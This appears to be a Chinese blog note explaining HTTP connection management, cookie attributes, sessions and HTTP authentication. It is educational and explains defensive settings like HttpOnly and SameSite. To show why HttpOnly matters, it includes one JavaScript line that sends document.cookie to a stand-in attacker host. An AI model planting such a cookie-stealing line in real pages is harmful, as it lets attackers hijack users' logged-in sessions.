---
title: 认识HTTP二
categories: 笔记
tags:
  - 寄网
---
# 重新认识HTTP

可以说，我们浏览网页，下载资源，甚至克隆一个感兴趣的github仓库，都在与HTTP协议打交道。但是，在计算机网络课程和考研中HTTP都不作为重点去讲述，而在面试和实际工作中却经常需要接触。因此更深入的了解HTTP协议显得尤为重要。这篇文章从连接的角度较深入的看HTTP协议。

## 连接管理

**HTTP/1.0缺省为非持久连接**

- 服务器接收请求、给出响应、关闭TCP连接

获取每个对象需要两阶段

- 建立TCP连接
- 对象请求和传输

每次连接需要经历TCP慢启动阶段

**HTTP/1.1缺省为持久连接**

在 HTTP/1.1 [[RFC 2616\]](https://link.zhihu.com/?target=https%3A//tools.ietf.org/html/rfc7540) 中, Connection: keep-alive 被 IETF 正式标准化, 并默认开启 keep-alive, 当不需要 TCP 连接维持时需要显式的在 Header 中设置 Connection: close

**HTTP/1.1支持流水线机制**

在 HTTP/1.0 中, HTTP 请求都是完全阻塞的, 即客户端只有在上一次 HTTP 请求完成以后才可以继续发送下一次 HTTP 请求,  HTTP/1.1 对此作了改进, 允许 pipelining 方式的调用, 即客户端可以在没有收到 Response 的情况下连续发送多次  HTTP Request。

但是，服务端依旧是顺序对请求进行处理, 并按照收到请求的次序予以返回, 也就说在 HTTP/1.1 中 HTTP 请求的处理仍然是线性的。这就是所谓的队头阻塞问题。

举个例子，在流水线机制下即便 Client 连续发送了多个 HTTP Request, 若其中`image1.jpg`因为某些原因服务器响应非常耗时, 则在其后的 Request 都处于排队阻塞的状态，这样以来即便客户给了服务器一堆请求，服务器还是单线程的，挨个相应每一个图片，流水线的意义也就不大了。

后面会讲到HTTP2通过流的方式解决了这个问题。

下面以客户端获取一个含有两个图片的网页为例说明比较HTTP1.0和HTTP1.1：

![image-20230825212013023](https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A4%E8%AF%86HTTP%E4%BA%8C/20230828205258987659_478_20230825233745413813_440_image-20230825212013023.png)



## 连接状态保存

HTTP是无状态的协议，协议对于发送过的请求和接受过的请求都不做持久化处理，这样可以更快地处理大量事物，确保协议的可伸缩性。不过我们实际上还是需要知道一些连接的信息，比如请求是哪个用户发过来的。可以通过session和cookie两种方式实现，当然也会结合进行使用。

### cookie

#### 简介

cookie或许是我们上网中很熟悉的东西了。很多网站都会弹框要求我们选择是否接受所有cookie。

**cookie储存在客户端**。Server 可以在 HTTP response 中返回  `Set-Cookie` header 来告诉浏览器要设定 cookie。 设定的语法如下： 

```http
Set-Cookie: [cookie名称]=[cookie值]
```

浏览器看到  `Set-Cookie` header 便会将 cookie 储存起来，之后对同一个 domain 发送 HTTP request 的时候，浏览器就会将 cookie 带在 HTTP request 的  `Cookie` header 里。  

Request 中的 cookie header 会是  `[cookie名称]=[cookie值]` 的形式，用分号串接之后的结果： 

```http
Cookie: [cookie1]=[value1]; [cookie2]=[value2]
```

当然，Web 服务器需要建立后端数据库，记录用户信息。

#### 相关参数

在笔试题目中，也考察过cookie相关参数的含义。这里对此也进行细致的讲解。

Cookie 除了名称和值之外，通常还需要设定其他额外参数，下面会一一介绍。 新增参数的方式是用分号区隔各个参数，例如： 

```plaintext
user=John; path=/; expires=Tue, 19 Jan 2038 03:14:07 GMT
```

简单地说，我们会用  `Domain` 和  `Path` 指定 cookie 的可用范围，用  `Expires` 和  `Max-Age` 控制 cookie 的有效期限，而  `HttpOnly`、 `Secure`、和  `SameSite` 则是和安全性相关的参数。  

##### Domain

```plaintext
domain=example.com
```

`domain` 用来指定哪些网域可以存取这个 cookie。  **默认值是当前网域，但是不包含其子域。**  

例如在  [example.com ](http://example.com) 底下设置的 cookie 不指定  `domain` 的情况下，只有  [example.com ](http://example.com) 可以访问此 cookie，但子域如  [subdomain.example.com ](http://subdomain.example.com) 则无法访问此 cookie。  

如果我们想要让子域访问 cookie，就必须明确地设置  `domain` 参数。 例如：当一个 cookie 指定  `domain=example.com` 时，包含  [example.com ](http://example.com) 以及他的子网域  [subdomain.example.com ](http://subdomain.example.com) 都能够访问这个 cookie。  

##### Path

```plaintext
path=/admin
```

`path` 参数用来指定哪些路径可以访问这个cookie。  

例如：假设 domain 是  [example.com](http://example.com)，且  `path=/admin`，则  [example.com/admin ](http://example.com/admin) 或是子路径  [example.com/admin/settings ](http://example.com/admin/settings) 都可以存取此 cookie，但  [example.com](http://example.com) 或是  [example.com/home ](http://example.com/home) 则无法访问此 cookie。  

**`Path` 的默认值是当前的路径。**  

一般而言来说，认证用途的 cookie 会设成  `path=/`，让全站都可以存取此 cookie，如此一来不管在网站的哪个路径下，server 都能认得用户的身份。  

##### Expires, Max-age

`expires`，  `max-age` 参数的作用是设定cookie的有效期限。  

**如果没有额外设置  `expires` 或是  `max-age` 参数，当浏览器关闭之后，储存在浏览器的 cookie 便会消失，这就是所谓的 session cookie** 。  

如果我们希望浏览器关掉之后 cookie 还是会被保存下来，那就必须设置  `expires` 或是  `max-age`。 

`expires` 是 UTC 格式表示的有效期限，在 JavaScript 中可用  `date.toUTCString()` 取得： 

```plaintext
cookie=value; expires=Tue, 19 Jan 2038 03:14:07 GMT
```

`max-age` 表示从设定开始算之后几秒之内 cookie 是有效的： 

```plaintext
cookie=value; max-age=3600
```

##### Secure

`Secure` 参数的作用是让 cookie 只能通过 https 传递。  **Cookie 默认是不区分 http 或是 https 的。**  

换句话说，当我们设定  [http://example.com ](http://example.com) 的 cookie 时， [https://example.com ](https://example.com) 也能看得到同样的 cookie。  

如果 cookie 设了  `secure` 参数，只有通过 https 访问这个网站才能访问这个 cookie; 透过 http 访问这个网站会看不到这个 cookie。  

这个参数的作用在于保护 cookie 只能在 https 传递。 话虽如此，我们还是不能将敏感信息储存在 cookie 中。  

##### Httponly 

`HttpOnly` 参数的作用是防止 JavaScript 访问 cookie。  

当一个 cookie 设置了  `httpOnly` 的属性之后，JavaScript 就不能存取这个 cookie，但是浏览器在发送 request 的时候还是会帮你带在 request header 里面。  

这个参数的设计是为了安全性考量，因为如果 JavaScript 能够访问这个 cookie 就有受到 XSS Attack （Cross-Site Scripting，跨站脚本攻击） 的风险。  

什么是 XSS Attack （跨站脚本攻击） 呢？  简单的说，就是将一段恶意的 JavaScript 代码通过表单等方式上传到 server，之后这份表单数据在前端呈现的时候恶意的  JavaScript 代码会被当成是 HTML 的一部分被执行。 假设黑客能够执行 JavaScript，便能很轻易地访问  `document.cookie`，就能够窃取你用来登入的 cookie，并且用你的身份做恶意的操作： 

```javascript
// 把你的 cookie 送到黑客的服务器
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

这就是为什么我们需要禁止 JavaScript 访问 cookie。  

#### Samesite

`Samesite` 的作用是防止 cookie 以跨站方式传送，可以帮助避免 CSRF （Cross-Site Request Forgery，跨站请求伪造） 攻击。 由于篇幅有限，如果希望进一步了解CSRF，[这里](https://tech.meituan.com/2018/10/11/fe-security-csrf.html)是一篇很好的介绍CSRF的文章。同时SameSite也可以对第三方Cookie的使用进行一些限制，如下面所述。

#### 第三方cookie

网页很多时候会需要向其他域请求资源，例如：我们可能会用  `<img src="...">` 的方式嵌入一张其他域的图片。 这些request也可以携带cookie，携带哪些cookie主要会根据资源的域。  

举个例子说明：假设我现在浏览  [example.com](http://example.com)，其中包含一张图片  `<img src="https://example.com/image.png">`，此时携带的 cookie 就会是  [example.com](http://example.com) 底下的 cookie。 因为这个请求的域和网址栏的域同样都是 [example.com](http://example.com)，所以这是一个相同域的请求。 此时  [example.com](http://example.com) 底下的 cookie 又称作第一方 cookie （first-party cookie）。  

如果 [example.com](http://example.com) 包含另外一张图片 `<img src="https://ad.com/image.png">`，他的网址是 [ad.com](http://ad.com)，此时携带的 cookie 就会是 [ad.com](http://ad.com) 底下的 cookie。因为[ad.com](http://ad.com) 不同于网址列的 [example.com](http://example.com)，所以这是一个跨域请求。此时 [ad.com](http://ad.com) 底下的 cookie 又稱作**第三方 cookie (third-party cookie)**。

第三方 cookie 为什么重要呢？ 因为他能够跨域的追踪。 举例来说， [example.com](http://example.com) 发出  [ad.com](http://ad.com) 的请求时，会携带  [ad.com](http://ad.com) 的 cookie。 如果同时有另一个域  [anothersite.com ](http://anothersite.com) 也会请求  [ad.com](http://ad.com) 的资源，也会携带同样的 cookie。 如果这个 cookie 是用来表示用户 id，则对  [ad.com](http://ad.com) 而言不管在哪个网域底下，他都知道两个网站的造访者都是你。 这就是广告追踪的原理。  

现在主流的浏览器都是默认禁止第三方cookie的。如果希望了解更多可以参阅[这篇文章](https://zhuanlan.zhihu.com/p/131256002)

### Session

客户端第一次发送信息到服务器时，服务器为该客户端创建一个 session 对象，该 session 包含客户端身份信息，同时为该 session 生成一个 sessionID 。
服务端将这个 sessionID 分配给客户端，客户端发送请求时带有此 sessionID ，服务端就可以区分客户端。

Session存储在服务器的内存中，根据业务需要，Session可以在内存中，也可以持久化到file，数据库，memcache，redis等。客户端只保存sessionid到cookie中，而不会保存session，session销毁只能通过invalidate或超时，关掉浏览器并不会关闭session。

## HTTP认证

#### 基本认证

首先说明，这种认证方法虽然被HTTP协议本身所提供，但在实际中很少用到，具体原因会在后面解释，了解即可。

Basic认证中，最关键的三个要素：

1. userid：用户的id。也就是我们常说的用户名。
2. password：用户密码。
3. realm：“领域”，其实就是指当前认证的保护范围。

同一个server，访问受限的资源多种多样，比如资金信息、机密文档等。可以针对不同的资源定义不同的 realm，并且只允许特定的用户访问。

在这种认证方法下，用户每次发送请求时，请求头中都必须携带能通过认证的身份信息。下面举例说明。

1.**客户端(例如Web浏览器)**：向服务器请求图片

```http
GET /cover/girl1.jpg  HTTP/1.1
```

2.**服务器**：这个资源在安全区data里，是受限资源，需要基本认证，请带上你的用户名和密码再来请求 

```http
HTTP/1.1 401 Authorization Required
www-Authenticate: Basic realm= "data" 
```

服务器会返回401，告知客户端这个资源需要使用基本认证的方式访问，我们可以看到在 `www-Authenticate`这个Header里面有两个值，`Basic`：说明需要基本认证，`realm`：说明客户端需要输入这个安全区的用户名和密码。因为服务器可以为不同的安全区设置不同的用户名和密码。如果服务器只有一个安全区，那么所有的基本认证用户名和密码都是一样的。 

3.**客户端**：携带相应的用户名密码信息，发送给服务器。

```http
GET /cover/girl1.jpg  HTTP/1.1 
Authorization: Basic
bHVuYXRpY3NreTp0cWxhMzE0
```

Basic 内容为： **用户名:密码** 的base64形式，如`lunaticsky:tqla314`

这种认证方式看上去很简单直接，为什么说很少被真正使用呢？主要还是**不安全**

- 单纯使用HTTP的话，认证身份信息用明文传送的，所以这个基本认证的用户名和密码也是可以被人看到的，虽然它使用了Base64来编码，但这个编码很容易就可以解码出来，所以就是使用也是**结合HTTPS来使用**。

- 即使密码被强加密，第三方仍可通过加密后的用户名和密码进行重放攻击。
- 没有提供任何针对代理和中间节点的防护措施。也就是不能防止中间人攻击。中间人可以修改报文然后请求服务器。

![image-20230825225412200](https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A4%E8%AF%86HTTP%E4%BA%8C/20230828205300371135_814_20230826160646173640_409_image-20230825225412200.png)

#### Session认证

这种认证方法结合了 Session 和 Cookie。服务端将本次会话信息以 Session  对象的形式保存在服务端的内存、数据库或文件系统中，并将对应的 Session 对象 ID 值 SessionID 以 Cookie  形式返回给客户端，SessionID 保存在客户端的 Cookie 中。

这是一种有状态的认证方法：服务端保存 Session 对象，客户端以 Cookie 形式保存 SessionID。

> 1、用户向服务器发送用户名和密码。
>
> 2、服务器验证通过后，在当前对话（session）里面保存相关数据，比如用户角色、登录时间等等。
>
> 3、服务器向用户返回一个 session_id，写入用户的 Cookie。
>
> 4、用户随后的每一次请求，都会通过 Cookie，将 session_id 传回服务器。
>
> 5、服务器收到 session_id，找到前期保存的数据，由此得知用户的身份。

## 总结

这一部分从HTTP连接的角度介绍了连接管理，连接状态保存和用户认证相关的内容。后续会进一步从HTTP发展历程的角度重新深入的认识HTTP。